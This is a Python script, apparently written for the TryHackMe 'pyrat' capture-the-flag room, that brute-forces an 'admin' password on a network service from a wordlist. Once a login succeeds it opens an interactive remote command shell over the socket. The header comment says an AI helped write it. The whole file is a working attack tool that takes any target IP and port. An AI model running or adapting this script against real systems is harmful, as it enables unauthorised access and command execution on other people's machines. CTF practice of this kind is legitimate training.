#script with help of claudi AI for tryhackme room pyrat https://tryhackme.com/r/room/pyrat
import socket
import time
import argparse

def connect_to_server(ip, port, timeout_value):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.settimeout(timeout_value)
    try:
        client_socket.connect((ip, port))
        return client_socket
    except socket.error as e:
        return None

def send_and_receive(client_socket, data):
    try:
        client_socket.sendall(data.encode("utf-8") + b"\n")
        response = client_socket.recv(1024).decode("utf-8", errors='ignore')
        return response
    except socket.timeout:
        return "Timeout while waiting for server response"
    except socket.error as e:
        return f"Error in communication: {e}"

def read_passwords_from_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = [line.strip() for line in file.readlines()]
        return passwords
    except IOError as e:
        print(f"Error reading password file: {e}")
        return []

def brute_force(ip, port, wordlist, timeout_value=10):
    password_list = read_passwords_from_file(wordlist)
    
    for password in password_list:
        client_socket = connect_to_server(ip, port, timeout_value)
        if not client_socket:
            time.sleep(5)
            continue

        response = send_and_receive(client_socket, "admin")
        if "Password:" not in response:
            client_socket.close()
            time.sleep(5)
            continue

        response = send_and_receive(client_socket, password)
        
        if "Welcome Admin" in response:
            print(f"Password found: {password}")
            print(f"Server response: {response}")
            while True:
                cmd = input("$ ")
                if cmd.lower() == "exit":
                    break
                response = send_and_receive(client_socket, cmd)
                print(response)
            return True
        
        client_socket.close()
        time.sleep(1)
    
    print("Password not found in the provided wordlist.")
    return False

def main():
    parser = argparse.ArgumentParser(description="Password brute-force script for CTF challenge")
    parser.add_argument("-u", "--ip", required=True, help="Target IP address")
    parser.add_argument("-p", "--port", type=int, required=True, help="Target port number")
    parser.add_argument("-w", "--wordlist", required=True, help="Path to the wordlist file")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Timeout value in seconds (default: 10)")
    
    args = parser.parse_args()
    
    brute_force(args.ip, args.port, args.wordlist, args.timeout)

if __name__ == "__main__":
    main()
